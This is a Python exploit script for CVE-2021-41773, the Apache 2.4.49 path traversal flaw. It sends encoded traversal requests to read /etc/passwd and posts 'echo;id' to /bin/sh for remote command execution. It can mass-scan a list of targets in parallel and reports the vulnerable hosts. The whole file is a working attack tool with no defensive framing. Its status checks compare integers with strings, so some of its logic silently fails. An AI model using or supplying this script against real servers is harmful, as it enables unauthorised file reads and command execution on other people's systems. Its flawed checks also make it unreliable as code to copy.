import sys
import concurrent.futures
import requests

global vul_target
vul_target = []

def check_vulnerable(target):
    print(f"Try Exploiting {target} ... ... ...")
    payload = '/cgi-bin/.%2e/.%2e/.%2e/.%2e'
    response = requests.get(f'http://{target}{payload}/etc/passwd')
    response_status = response.status_code
    response_text = response.text
    if response_status == '500':
        data = 'echo;id'
        response = requests.post(f'http://{target}{payload}/bin/sh', data= data)
        response_status = response.status_code
    
    if response_status == '200' or ('root' in response_text):
        vul_target.append(target)
    else:
        print(f"Target {target} is not vulnerable.")
        


def check_multiple_targets(file):
    with open(file, 'r', encoding= 'utf-8') as f:
        targets = f.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
        executor.map(check_vulnerable, targets)


def main():
    try:
        if sys.argv[1] == '-h':
            h = '''
    [+] python ./exploit.py [-OPTIONS] [Target/List of Targets]
    [+] -h : help
    [+] -url <target>: specifict the target to check 
    [+] -list <filename>: Scan multiple targets
            '''
            print(h)

        else:
                if sys.argv[1] == '-url':
                    try:
                        target = sys.argv[2]  # target url
                        check_vulnerable(target)
                    except:
                        print('Something went wrong with the args.')
                        exit()
                
                if sys.argv[1] == '-list':
                    try:
                        file = sys.argv[2]  # file to request
                        check_multiple_targets(file)
                    except:
                        print('Something went wrong with the args.')
                        exit()
    except:
        print("-------------++Usage++-------------")
        print('''
    [+] python ./exploit.py [-OPTIONS] [Target/List of Targets]
    [+] -h : help
    [+] -url <target>: specifict the target to check 
    [+] -list <filename>: Scan multiple targets''')


    if len(vul_target) > 0:
        print(f"Found {len(vul_target)} is Vulnerable")
        for target in vul_target:
            print("[+] "+target)
    else:
        print("-------------------------------------\n[-]  Not found Vulerable target")
    
if __name__ == '__main__':
    print("""
[*] Exploit Title: Apache HTTP Server 2.4.49 Path Traversal
[*] CVE: CVE-2021-41773
[*] Version: Apache 2.4.49
""")
    main()
    
